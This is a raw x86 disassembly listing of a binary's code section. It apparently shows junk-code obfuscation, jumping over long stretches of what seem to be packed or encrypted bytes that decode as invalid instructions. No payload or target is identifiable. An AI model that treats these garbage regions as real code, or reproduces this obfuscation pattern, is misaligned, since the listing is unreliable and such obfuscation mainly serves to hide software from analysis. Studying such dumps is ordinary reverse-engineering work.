  4204ac:	or     DWORD PTR ds:0x428337,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42814b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42812f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428367,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42814b,0x0
  420500:	mov    DWORD PTR ds:0x4282b3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42824f
  42051b:	cmp    DWORD PTR ds:0x42814b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428e88
  420543:	mov    esi,DWORD PTR ds:0x42813b
  420549:	sbb    DWORD PTR ds:0x428157,esi
  42054f:	and    DWORD PTR ds:0x428253,edx
  420555:	sbb    DWORD PTR ds:0x428207,edx
  42055b:	mov    esi,DWORD PTR ds:0x42833f
  420561:	or     DWORD PTR ds:0x428343,esi
  420567:	mov    esi,DWORD PTR ds:0x428167
  42056d:	mov    edx,DWORD PTR ds:0x4282ff
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42833f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428133,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428357,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x4281f3,0x2222
  4205bd:	not    DWORD PTR ds:0x428203
  4205c3:	cmp    DWORD PTR ds:0x428133,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42835f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e0c
  4205e8:	xor    edx,DWORD PTR ds:0x428207
  4205ee:	mov    ecx,DWORD PTR ds:0x4281ef
  4205f4:	or     DWORD PTR ds:0x42811f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428293
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42835b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42823b
  42061a:	xor    DWORD PTR ds:0x428227,edx
  420620:	movzx  ecx,WORD PTR ds:0x428213
  420627:	and    ecx,DWORD PTR ds:0x42834b
  42062d:	mov    DWORD PTR ds:0x428213,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42835f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	int3   
  42066f:	inc    esp
  420670:	test   DWORD PTR [esp+ebp*4+0x1d],edi
  420674:	push   ss
  420675:	sbb    BYTE PTR [ebx-0x50e7e7ee],ah
  42067b:	mov    cl,0xbf
  42067d:	(bad)  
  42067f:	mov    al,BYTE PTR [eax+0x55]
  420682:	cmp    bh,BYTE PTR [eax+edi*2-0x13]
  420686:	call   0x17d00928
  42068b:	lds    edi,FWORD PTR [ebx-0x448f9f3]
  420691:	arpl   WORD PTR [edi],sp
  420693:	mov    WORD PTR [ecx],fs
  420695:	cmc    
  420696:	xchg   edx,eax
  420697:	or     eax,0xfe06c186
  42069c:	mov    ds:0xd76d2ed5,eax
  4206a1:	mov    DWORD PTR [edi],edx
  4206a3:	jmp    0x57c5:0xbb3fe9f0
  4206aa:	stos   BYTE PTR es:[edi],al
  4206ab:	mov    ds:0x60f8ff94,eax
  4206b0:	sbb    BYTE PTR [edx-0x68],bh
  4206b3:	ins    BYTE PTR es:[edi],dx
  4206b4:	leave  
  4206b5:	mov    cl,BYTE PTR [eax-0x50]
  4206b8:	fisttp WORD PTR [esi]
  4206ba:	sub    DWORD PTR [esi-0x5291ad58],esp
  4206c0:	xchg   ebx,eax
  4206c1:	xrelease xchg DWORD PTR [ebx-0x5e7a3659],esp
  4206c8:	inc    edi
  4206c9:	add    ch,al
  4206cb:	sub    WORD PTR [esi-0x3a],bp
  4206cf:	pop    ecx
  4206d0:	inc    edx
  4206d1:	xchg   ecx,eax
  4206d2:	idiv   BYTE PTR [ecx]
  4206d4:	sbb    DWORD PTR [edx-0x34d3b1e8],edx
  4206da:	addr16 push ss
  4206dc:	jmp    0xbd42267f
  4206e1:	out    0x2,eax
  4206e3:	pop    ebp
  4206e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206e5:	push   0xffffffdd
  4206e7:	jge    0x4206c3
  4206e9:	out    dx,eax
  4206ea:	dec    ebx
  4206eb:	cmp    al,0xf0
  4206ed:	xchg   DWORD PTR [edx-0x27],edx
  4206f0:	dec    ecx
  4206f1:	fild   QWORD PTR [ebx+0x39]
  4206f4:	push   ecx
  4206f5:	je     0x42067b
  4206f7:	les    ecx,FWORD PTR [eax+0x4d5f0750]
  4206fd:	push   ds
  4206fe:	mov    esi,DWORD PTR [edx]
  420700:	test   eax,0xf27fbd06
  420705:	test   eax,0xf4fc18bd
  42070a:	out    dx,al
  42070b:	push   es
  42070c:	mov    ebx,0xbfe15325
  420711:	lea    esp,[eax+0x10]
  420714:	icebp  
  420715:	loopne 0x420772
  420717:	sbb    DWORD PTR [edi-0x3763a339],edx
  42071d:	out    dx,al
  42071e:	pop    ds
  42071f:	loop   0x42079f
  420721:	pop    eax
  420722:	fisubr WORD PTR [edi-0x5b]
  420725:	leave  
  420726:	in     eax,0x79
  420728:	and    eax,0x2e4889d8
  42072d:	sbb    ecx,DWORD PTR [esi]
  42072f:	mov    bl,0xaf
  420731:	xchg   ecx,eax
  420732:	mov    al,0xa2
  420734:	and    DWORD PTR [esi+0x53],edx
  420737:	je     0x4206f6
  420739:	push   cs
  42073a:	or     eax,0x4eb06bfb
  42073f:	ja     0x420702
  420741:	xlat   BYTE PTR ds:[ebx]
  420742:	ret    0xbab2
  420745:	push   ecx
  420746:	mov    cs,WORD PTR [ebx]
  420748:	cs (bad) 
  42074a:	sub    al,0xba
  42074c:	cmp    DWORD PTR [ebx],ebx
  42074e:	lds    ebx,FWORD PTR [ebp+0x2e7b2f2f]
  420754:	inc    edx
  420755:	push   eax
  420756:	xchg   ecx,eax
  420757:	add    eax,DWORD PTR cs:[di]
  42075b:	dec    esp
  42075c:	xchg   edx,eax
  42075d:	ret    
  42075e:	push   ebp
  42075f:	les    ecx,FWORD PTR [ecx-0x316437cb]
  420765:	jno    0x4207b5
  420767:	fxch   st(7)
  420769:	push   ecx
  42076a:	push   0x55
  42076c:	mov    al,0xaa
  42076e:	pop    esp
  42076f:	pop    ds
  420770:	dec    ecx
  420771:	adc    ecx,ecx
  420773:	daa    
  420774:	std    
  420775:	xchg   esi,eax
  420776:	adc    edi,edi
  420778:	push   eax
  420779:	stc    
  42077a:	sar    BYTE PTR [esi],1
  42077c:	xor    ah,cl
  42077e:	lods   eax,DWORD PTR ds:[esi]
  42077f:	mov    ah,0x6a
  420781:	mov    ds:0x44ec7657,eax
  420786:	push   eax
  420787:	jge    0x42077a
  420789:	adc    al,0xd5
  42078b:	sub    ebx,DWORD PTR [eax+esi*8]
  42078e:	std    
  42078f:	cmp    eax,0x103bf9ea
  420794:	test   DWORD PTR [edx+0x1b],ebp
  420797:	cdq    
  420798:	retf   
  420799:	(bad)  
  42079a:	lods   eax,DWORD PTR ds:[esi]
  42079b:	fadd   DWORD PTR [edx+0x32]
  42079e:	jp     0x420806
  4207a0:	dec    ecx
  4207a1:	mov    ebp,0xed444cef
  4207a6:	dec    edx
  4207a7:	call   0xf502:0x49bf2e54
  4207ae:	imul   ebx,DWORD PTR [ecx-0x2d],0x77
  4207b2:	xchg   edi,eax
  4207b3:	xchg   edx,eax
  4207b4:	or     eax,0x21d18791
  4207b9:	pop    es
  4207ba:	jmp    0xd64f:0x72d21ae2
  4207c1:	jne    0x4207e0
  4207c3:	cmp    eax,0xd9bb4c37
  4207c8:	xchg   edx,eax
  4207c9:	add    eax,0xe9852c1c
  4207ce:	gs cli 
  4207d0:	and    al,0x77
  4207d2:	imul   eax,DWORD PTR [edi-0x190ff525],0x1f
  4207d9:	lods   eax,DWORD PTR ds:[esi]
  4207da:	push   0xa51644fd
  4207df:	out    0xb4,al
  4207e1:	add    al,0x99
  4207e3:	add    eax,0xabe194dd
  4207e8:	cld    
  4207e9:	sbb    DWORD PTR [ebx+ebp*8-0x6c],ebx
  4207ed:	jecxz  0x4207ec
  4207ef:	cmp    cl,ah
  4207f1:	dec    edi
  4207f2:	cmp    eax,0x3fdfd8d2
  4207f7:	push   0x6e9d2b08
  4207fc:	pop    eax
  4207fd:	lods   al,BYTE PTR ds:[esi]
  4207fe:	add    esi,DWORD PTR [edi-0x45]
  420801:	loop   0x4207c2
  420803:	ins    BYTE PTR es:[edi],dx
  420804:	push   ds
  420805:	sahf   
  420806:	mov    esi,0x93857af0
  42080b:	pop    ebp
  42080c:	sbb    DWORD PTR [ecx],ebx
  42080e:	fnstsw WORD PTR [ebx-0x12]
  420811:	and    al,0xf0
  420813:	(bad)  
  420815:	and    ebx,DWORD PTR ds:0xe5cc94cb
  42081b:	xchg   esi,eax
  42081c:	mov    bh,0x7b
  42081e:	inc    ebx
  42081f:	dec    ebx
  420820:	ins    BYTE PTR es:[edi],dx
  420821:	pop    esi
  420822:	adc    DWORD PTR [eax+0x18fcd005],esi
  420828:	stos   BYTE PTR es:[edi],al
  420829:	adc    al,0xdd
  42082b:	imul   edx,edx,0xf91ab3f8
  420831:	sahf   
  420832:	and    BYTE PTR [ebx+0x7b],al
  420835:	mov    ds:0xcd94a471,eax
  42083a:	adc    ebp,DWORD PTR [edx+0x5ccebbab]
  420840:	inc    edi
  420841:	ss mov al,0xa
  420844:	mov    BYTE PTR [edi+0x76],dl
  420847:	inc    eax
  420848:	ins    DWORD PTR es:[edi],dx
  420849:	dec    ebp
  42084a:	pop    ds
  42084b:	dec    esi
  42084c:	fild   WORD PTR [edi-0x50]
  42084f:	scas   al,BYTE PTR es:[edi]
  420850:	inc    ebp
  420851:	icebp  
  420852:	nop
  420853:	ret    0x5be
  420856:	ret    
  420857:	outs   dx,DWORD PTR ds:[esi]
  420858:	shr    ebp,cl
  42085a:	imul   edx,DWORD PTR [ecx-0xf206fc4],0x2fb2a203
  420864:	add    dh,0xaa
  420867:	mov    cl,0x57
  420869:	add    ebx,edx
  42086b:	or     al,0xb4
  42086d:	gs jmp 0xafbbfd9c
  420873:	sbb    eax,0xc11ec760
  420878:	fmul   QWORD PTR [esi-0x64]
  42087b:	mov    esp,0xcb18db94
  420880:	sbb    edi,DWORD PTR ds:0x63135fc7
  420886:	add    BYTE PTR [eax+edx*8],0xb3
  42088a:	ret    
  42088b:	(bad)  
  42088c:	lods   eax,DWORD PTR ds:[esi]
  42088d:	xor    ebx,DWORD PTR [eax-0x45951c82]
  420893:	mov    BYTE PTR [ebp+0x1edb85d0],ah
  420899:	cmp    al,dl
  42089b:	mov    ebx,DWORD PTR [ecx+0x44c18101]
  4208a1:	shl    DWORD PTR [edi],cl
  4208a3:	sbb    BYTE PTR [esi+0x28],ah
  4208a6:	mov    bh,0x1f
  4208a8:	(bad)  
  4208a9:	fs ss and al,0x7f
  4208ad:	mov    edx,0x8ce15c4d
  4208b2:	test   BYTE PTR [esi],dl
  4208b4:	test   al,0xc9
  4208b6:	mov    ah,0xcd
  4208b8:	iret   
  4208b9:	push   edi
  4208ba:	ds cmp esp,eax
  4208bd:	xor    BYTE PTR [ebx],0xcd
  4208c0:	inc    edx
  4208c1:	mov    ds:0xde72a78b,al
  4208c6:	jl     0x420923
  4208c8:	aad    0xc6
  4208ca:	mov    dh,0x4f
  4208cc:	js     0x42093e
  4208ce:	cmp    esi,DWORD PTR [edx-0x34]
  4208d1:	or     al,BYTE PTR [ebp+ebx*4-0x44]
  4208d5:	cld    
  4208d6:	ret    0xd95a
  4208d9:	xchg   DWORD PTR [esi],eax
  4208db:	xchg   edi,eax
  4208dc:	gs popf 
  4208de:	push   eax
  4208df:	mov    edi,0x51d13714
  4208e4:	fmul   QWORD PTR [edx]
  4208e6:	(bad)  
  4208e8:	xchg   esp,eax
  4208e9:	mov    dl,0xac
  4208eb:	push   ss
  4208ec:	xor    BYTE PTR [ecx],bh
  4208ee:	call   DWORD PTR [ebx+0x6e13099]
  4208f4:	(bad)  
  4208f5:	cli    
  4208f6:	sbb    ecx,edi
  4208f8:	popa   
  4208f9:	lea    eax,[eax-0x28]
  4208fc:	mov    ch,0x84
  4208fe:	mov    DWORD PTR [esp+ecx*4+0x63],edx
  420902:	jmp    0xb422:0x4c184b84
  420909:	and    eax,0x8fd6c97
  42090e:	or     al,0x10
  420910:	(bad)  
  420911:	leave  
  420912:	pop    esi
  420913:	loop   0x42090d
  420915:	call   0xa036e4
  42091a:	test   al,0x87
  42091c:	xchg   BYTE PTR [ecx-0x307540d4],cl
  420922:	inc    DWORD PTR [esi+ecx*2]
  420925:	stos   DWORD PTR es:[edi],eax
  420926:	mov    cl,0xbe
  420928:	shl    DWORD PTR [ebp+0x69],0x75
  42092c:	add    al,al
  42092e:	mov    edi,DWORD PTR [esi-0x3a]
  420931:	cmp    DWORD PTR [eax-0x556ded97],0xe
  420938:	int3   
  420939:	loopne 0x42092a
  42093b:	push   ecx
  42093c:	fs pop edi
  42093e:	dec    ebp
  42093f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420940:	mov    ah,0x81
  420942:	or     BYTE PTR [edi*2+0x3b762258],ch
  420949:	into   
  42094a:	int    0xb3
  42094c:	dec    ebx
  42094d:	imul   esi,esi,0xffffffb0
  420950:	jmp    0xf61e407b
  420955:	jmp    0x9231f7d6
  42095a:	pop    eax
  42095b:	or     DWORD PTR [edx-0x34],edi
  42095e:	ins    BYTE PTR es:[edi],dx
  42095f:	mov    dl,0x74
  420961:	outs   dx,DWORD PTR ds:[esi]
  420962:	pusha  
  420963:	retf   0x4cc2
  420966:	xor    BYTE PTR [ebp+0x7914867e],bl
  42096c:	sahf   
  42096d:	imul   eax,DWORD PTR [edx],0x3bd88a4e
  420973:	fistp  QWORD PTR [ebx+0x25]
  420976:	jo     0x4209f1
  420978:	xor    eax,0x4d4ac523
  42097d:	mov    ds:0xd94f0b30,al
  420982:	xor    DWORD PTR [ebx+0x43],ecx
  420985:	pop    ecx
  420986:	cld    
  420987:	inc    edi
  420988:	(bad)  
  42098a:	and    BYTE PTR [edx+0x79afa87f],dh
  420990:	aam    0x12
  420992:	push   edx
  420993:	scas   al,BYTE PTR es:[edi]
  420994:	xor    eax,0x9976f97b
  420999:	mov    ss,edi
  42099b:	fsubr  QWORD PTR [edi]
  42099d:	and    al,0x5b
  42099f:	sub    eax,0x66edb79b
  4209a4:	mov    cl,0xa2
  4209a6:	xor    ecx,edx
  4209a8:	sub    bl,bl
  4209aa:	stos   BYTE PTR es:[edi],al
  4209ab:	jle    0x4209e1
  4209ad:	sub    al,0x7c
  4209af:	mov    cl,BYTE PTR [edi-0x4f684540]
  4209b5:	loopne 0x4209e0
  4209b7:	push   eax
  4209b8:	lahf   
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428223
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282bf,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x4282e7,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x4281ff
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42812b,0x6139
  420a0d:	mov    DWORD PTR ds:0x428363,0x3849
  420a17:	cmp    DWORD PTR ds:0x4282e7,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e10
  420a34:	sub    DWORD PTR ds:0x4282bb,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x4281ef,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42824b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282bb
  420a66:	sub    DWORD PTR ds:0x4282cf,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42812f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428243,0x0
  420a81:	mov    DWORD PTR ds:0x4282ab,ecx
  420a87:	mov    esi,DWORD PTR ds:0x4282e3
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42822b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428243,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e14
  420abd:	mov    esi,DWORD PTR ds:0x42832b
  420ac3:	or     DWORD PTR ds:0x428253,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428163
  420ad1:	mov    esi,DWORD PTR ds:0x4283a7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42812b
  420ae2:	or     DWORD PTR ds:0x428253,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282b3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xfa
  420b0e:	pusha  
  420b0f:	(bad)  
  420b10:	jo     0x420b48
  420b12:	pop    ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx-0x8e7e7ee],ah
  420b1a:	cmp    al,0xf6
  420b1c:	cs xchg edx,eax
  420b1e:	test   eax,0x996bcc5c
  420b23:	cmp    edx,DWORD PTR [ebx]
  420b25:	ficomp DWORD PTR [esi]
  420b27:	(bad)  
  420b28:	push   esp
  420b29:	add    edi,esp
  420b2b:	in     al,0x91
  420b2d:	test   BYTE PTR [ecx+eiz*4-0x24],dl
  420b31:	push   ecx
  420b32:	or     DWORD PTR [esi],0x62
  420b35:	or     esp,edi
  420b37:	cs dec esi
  420b39:	mov    eax,ds:0x2f4a0e67
  420b3e:	js     0x420b77
  420b40:	mov    ah,0x58
  420b42:	(bad)  
  420b43:	scas   al,BYTE PTR es:[edi]
  420b44:	js     0x420bac
  420b46:	outs   dx,WORD PTR ds:[esi]
  420b48:	sbb    DWORD PTR [esi-0x419f337c],ebx
  420b4e:	and    ebx,DWORD PTR [eax-0x61]
  420b51:	scas   eax,DWORD PTR es:[edi]
  420b52:	xor    dl,BYTE PTR [edi*1+0x19f000cd]
  420b59:	or     edx,DWORD PTR [edi+0x1f]
  420b5c:	(bad)  
  420b5d:	into   
  420b5e:	out    dx,eax
  420b5f:	(bad)  
  420b61:	(bad)  
  420b63:	outs   dx,BYTE PTR ds:[esi]
  420b64:	push   es
  420b65:	test   eax,ebp
  420b67:	cmp    DWORD PTR [esi+0x4f],0x1965d7d5
  420b6e:	mov    DWORD PTR [ebp+eiz*8-0x6f7a65f8],eax
  420b75:	mov    bl,0xd0
  420b77:	add    cl,BYTE PTR [edx+esi*1]
  420b7a:	xchg   esi,eax
  420b7b:	adc    esi,DWORD PTR [edi-0xf93698f]
  420b81:	aad    0xa6
  420b83:	and    DWORD PTR [esi],eax
  420b85:	mov    eax,ds:0xcdf82a02
  420b8a:	aam    0x8a
  420b8c:	ret    0xc586
  420b8f:	cli    
  420b90:	ror    BYTE PTR [ebx+edi*4-0x18],0x7f
  420b95:	or     dl,BYTE PTR [ebx+0x1a530e58]
  420b9b:	aad    0x47
  420b9d:	jne    0x420b56
  420b9f:	sub    esi,ecx
  420ba1:	inc    ebx
  420ba2:	mov    dh,0x52
  420ba4:	cmc    
  420ba5:	sbb    DWORD PTR [edi],ecx
  420ba7:	adc    al,BYTE PTR [edi]
  420ba9:	dec    DWORD PTR [edi+0x4c802438]
  420baf:	lods   eax,DWORD PTR ds:[esi]
  420bb0:	sbb    DWORD PTR [esi],esi
  420bb2:	ins    BYTE PTR es:[edi],dx
  420bb3:	add    ch,BYTE PTR [edx]
  420bb5:	ds cmp edx,esp
  420bb8:	(bad)  
  420bb9:	retf   0xde0e
  420bbc:	push   edi
  420bbd:	sub    al,0x9b
  420bbf:	enter  0xe22f,0x10
  420bc3:	inc    eax
  420bc4:	add    DWORD PTR [edi+0x19],0x3624b192
  420bcb:	push   ebx
  420bcc:	push   ecx
  420bcd:	or     BYTE PTR [edi+edi*1-0x9cd3dc0],dl
  420bd4:	sub    DWORD PTR [eax+0x6c],esp
  420bd7:	lea    esp,[edi-0x2e]
  420bda:	aam    0x8e
  420bdc:	loope  0x420bbe
  420bde:	mov    dl,0x32
  420be0:	add    DWORD PTR [edi-0x1a903a9a],ebx
  420be6:	fwait
  420be7:	sub    DWORD PTR [ebx-0x11],eax
  420bea:	pushf  
  420beb:	lea    ecx,[edx-0x30568a9a]
  420bf1:	repz jg 0x420c53
  420bf4:	hlt    
  420bf5:	push   ds
  420bf6:	or     BYTE PTR [ebx],al
  420bf8:	aas    
  420bf9:	sbb    eax,0x76c7ffea
  420bfe:	lods   eax,DWORD PTR ds:[esi]
  420bff:	dec    ebx
  420c00:	arpl   dx,cx
  420c02:	cld    
  420c03:	das    
  420c04:	pop    ebp
  420c05:	stos   DWORD PTR es:[edi],eax
  420c06:	push   eax
  420c07:	push   ebp
  420c08:	cli    
  420c09:	ds ret 0x8b73
  420c0d:	xchg   BYTE PTR [ebx],cl
  420c0f:	add    eax,0x12c4e4bb
  420c14:	int    0x73
  420c16:	lahf   
  420c17:	sbb    bl,BYTE PTR [ebp+0x46]
  420c1a:	adc    edi,DWORD PTR [ecx]
  420c1c:	cmp    DWORD PTR [esi-0x1ae5c327],esp
  420c22:	dec    esp
  420c23:	push   0x524686e0
  420c28:	jmp    0xcfb2:0x3cc92f9
  420c2f:	cmp    DWORD PTR [edx],esp
  420c31:	mov    bh,0xb8
  420c33:	mov    ebp,0x615e11db
  420c38:	fimul  DWORD PTR [ebx+0x7e]
  420c3b:	xlat   BYTE PTR ds:[ebx]
  420c3c:	mov    edx,0x2b375a08
  420c41:	xchg   ebp,eax
  420c42:	pop    esp
  420c43:	shr    DWORD PTR [eax+0x14],1
  420c46:	add    edx,DWORD PTR [ecx-0x3]
  420c49:	int3   
  420c4a:	sub    DWORD PTR [ecx+0x49ce60aa],0x19
  420c51:	shl    ch,cl
  420c53:	add    DWORD PTR [eax-0x47690c5],esp
  420c59:	mov    WORD PTR [eax+0x6f],ds
  420c5c:	mov    ecx,ebp
  420c5e:	and    al,0xc0
  420c60:	out    0xae,eax
  420c62:	mov    es,WORD PTR [ebp-0x49a907b1]
  420c68:	cli    
  420c69:	cmp    BYTE PTR [edi-0x73d2cca4],ah
  420c6f:	cmp    eax,0x2ee78077
  420c74:	rcl    ecx,0xba
  420c77:	mov    ebp,DWORD PTR [edi+edx*4]
  420c7a:	push   0x41
  420c7c:	stc    
  420c7d:	sar    DWORD PTR [edi],cl
  420c7f:	fprem  
  420c81:	out    0x30,al
  420c83:	cmp    BYTE PTR [ebp+0x5818ca2e],ah
  420c89:	aad    0x87
  420c8b:	push   ds
  420c8c:	fiadd  DWORD PTR [esi]
  420c8e:	push   ss
  420c8f:	mov    dl,0x0
  420c91:	test   DWORD PTR [edx-0x70],ecx
  420c94:	out    dx,al
  420c95:	pop    ss
  420c96:	cmp    DWORD PTR [esi-0x6b15d612],ecx
  420c9c:	add    DWORD PTR [esi-0x74],esp
  420c9f:	loopne 0x420cab
  420ca1:	mov    dl,0xa3
  420ca3:	inc    esi
  420ca4:	(bad)  
  420ca5:	call   0xe4a4:0xd6f360d2
  420cac:	sub    al,0x7d
  420cae:	fld    QWORD PTR [edi-0x74]
  420cb1:	mov    al,BYTE PTR [ecx+ecx*4+0x31b69880]
  420cb8:	sti    
  420cb9:	xchg   DWORD PTR [ebp+0x4a9a6fe4],eax
  420cbf:	pop    esp
  420cc0:	data16 lods al,BYTE PTR ds:[esi]
  420cc2:	jo     0x420cbb
  420cc4:	loop   0x420caf
  420cc6:	xlat   BYTE PTR ds:[ebx]
  420cc7:	lea    edx,[esp+eax*4-0x5e]
  420ccb:	iret   
  420ccc:	setno  BYTE PTR [ecx+0x14a693aa]
  420cd3:	push   0xffffffe8
  420cd5:	jg     0x420cfc
  420cd7:	pop    es
  420cd8:	into   
  420cd9:	stos   DWORD PTR es:[edi],eax
  420cda:	mov    al,ds:0xa0b3c81a
  420cdf:	sbb    esp,0xffffffe5
  420ce2:	in     eax,0xd9
  420ce4:	cmp    eax,eax
  420ce6:	mov    al,ds:0xd9a1b367
  420ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cec:	out    0xad,al
  420cee:	dec    ecx
  420cef:	xor    eax,0xc0a45bf0
  420cf4:	and    DWORD PTR [eax-0x76b27fb7],esi
  420cfa:	pusha  
  420cfb:	sbb    al,0x26
  420cfd:	inc    ecx
  420cfe:	int3   
  420cff:	call   0xd47e:0xc894b438
  420d06:	stos   DWORD PTR es:[edi],eax
  420d07:	fwait
  420d08:	push   edi
  420d09:	add    DWORD PTR [eax],ebp
  420d0b:	dec    edi
  420d0c:	jp     0x420c9c
  420d0e:	push   eax
  420d0f:	cdq    
  420d10:	push   ecx
  420d11:	xor    edi,DWORD PTR [ebx-0x72ea8e08]
  420d17:	sub    al,0x20
  420d19:	dec    ebx
  420d1a:	pop    edx
  420d1b:	xchg   ecx,eax
  420d1c:	(bad)  
  420d1d:	pop    esp
  420d1e:	push   esp
  420d1f:	nop
  420d20:	xchg   ebp,eax
  420d21:	sub    esi,edx
  420d23:	mov    ebx,0x3dab1e92
  420d28:	dec    esi
  420d29:	ja     0x420d32
  420d2b:	push   ebx
  420d2c:	pop    edi
  420d2d:	inc    edx
  420d2e:	or     DWORD PTR [esi-0x6e2091b5],esi
  420d34:	xchg   esp,ebp
  420d36:	inc    DWORD PTR [ebp+0x5a83978e]
  420d3c:	fld    st(0)
  420d3e:	pushf  
  420d3f:	mov    ecx,es
  420d41:	pop    edx
  420d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d43:	test   DWORD PTR ds:0x4058fe6d,0xbc1df50b
  420d4d:	repz lahf 
  420d4f:	call   0xa42a:0xb2a54326
  420d56:	xor    eax,0x798adb62
  420d5b:	ds inc ebx
  420d5d:	push   edi
  420d5e:	inc    ebp
  420d5f:	dec    ebp
  420d60:	stc    
  420d61:	stc    
  420d62:	inc    ebx
  420d63:	push   edx
  420d64:	(bad)  
  420d65:	sbb    DWORD PTR [edx],edi
  420d67:	pop    es
  420d68:	in     eax,dx
  420d69:	inc    edx
  420d6a:	inc    ecx
  420d6b:	mov    esp,DWORD PTR [ecx]
  420d6d:	sbb    al,0xd4
  420d6f:	inc    ebp
  420d70:	sbb    BYTE PTR [edx],bl
  420d72:	mov    BYTE PTR [edx],al
  420d74:	shr    BYTE PTR [edi+eax*2-0x7e],1
  420d78:	add    eax,0x1471116a
  420d7d:	data16 and al,0xe2
  420d80:	push   0xfffffff2
  420d82:	outs   dx,BYTE PTR ds:[esi]
  420d83:	jnp    0x420d77
  420d85:	mov    bh,bh
  420d87:	mov    esi,0xd981275d
  420d8c:	sub    al,0x4b
  420d8e:	pop    esi
  420d8f:	shl    cl,cl
  420d91:	mov    edi,0x576d48b3
  420d96:	adc    edi,DWORD PTR [ebx+0x44]
  420d99:	jp     0x420df4
  420d9b:	fwait
  420d9c:	mov    edx,0xe1e63565
  420da1:	popf   
  420da2:	pop    esi
  420da3:	mov    ds:0xe30a0ea,al
  420da8:	sbb    DWORD PTR [ecx],edx
  420daa:	retf   
  420dab:	pop    es
  420dac:	data16 (bad) 
  420dae:	fmul   DWORD PTR [esi+0x38]
  420db1:	inc    ebp
  420db2:	aam    0xe6
  420db4:	dec    edi
  420db5:	jecxz  0x420da8
